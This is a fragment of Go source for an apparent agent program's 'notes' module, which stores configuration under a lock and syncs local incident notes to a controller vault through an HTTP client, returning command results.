func (m *systemInfoModule) Shutdown(context.Context) error {
	return nil
}

func newNotesModule() *notesModule {
	return &notesModule{}
}

type notesModule struct {
	mu        sync.RWMutex
	manager   *notes.Manager
	agentID   string
	baseURL   string
	authKey   string
	client    *http.Client
	logger    *log.Logger
	userAgent string
}

func (m *notesModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "notes",
		Title:       "Incident Notes",
		Description: "Secure local note taking synchronized with the controller vault.",
		Commands:    []string{"notes.sync"},
		Capabilities: []ModuleCapability{
			{
				ID:          "notes.sync",
				Name:        "Notes sync",
				Description: "Synchronize local incident notes to the operator vault with delta compression.",
			},
		},
	}
}

func (m *notesModule) ID() string {
	return "notes"
}

func (m *notesModule) Init(_ context.Context, cfg Config) error {
	m.applyConfig(cfg)
	return nil
}

func (m *notesModule) UpdateConfig(cfg Config) error {
	m.applyConfig(cfg)
	return nil
}

func (m *notesModule) applyConfig(cfg Config) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.manager = cfg.Notes
	m.agentID = cfg.AgentID
	m.baseURL = cfg.BaseURL
	m.authKey = cfg.AuthKey
	m.client = cfg.HTTPClient
	m.logger = cfg.Logger
	m.userAgent = cfg.UserAgent
}

func (m *notesModule) snapshot() (*notes.Manager, *http.Client, string, string, string, string, *log.Logger) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.manager, m.client, m.baseURL, m.agentID, m.authKey, m.userAgent, m.logger
}

func (m *notesModule) Handle(ctx context.Context, cmd protocol.Command) error {
	manager, client, baseURL, agentID, authKey, userAgent, logger := m.snapshot()
	completedAt := time.Now().UTC().Format(time.RFC3339Nano)
	if manager == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "notes manager unavailable",
			CompletedAt: completedAt,
		})
	}

	if err := manager.SyncShared(ctx, client, baseURL, agentID, authKey, userAgent); err != nil {
		if logger != nil {
			logger.Printf("notes sync failed: %v", err)
		}
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       err.Error(),
			CompletedAt: completedAt,
		})
	}

	return WrapCommandResult(protocol.CommandResult{
		CommandID:   cmd.ID,
		Success:     true,
		CompletedAt: completedAt,
	})
}

func (m *notesModule) Shutdown(context.Context) error {
	return nil
}
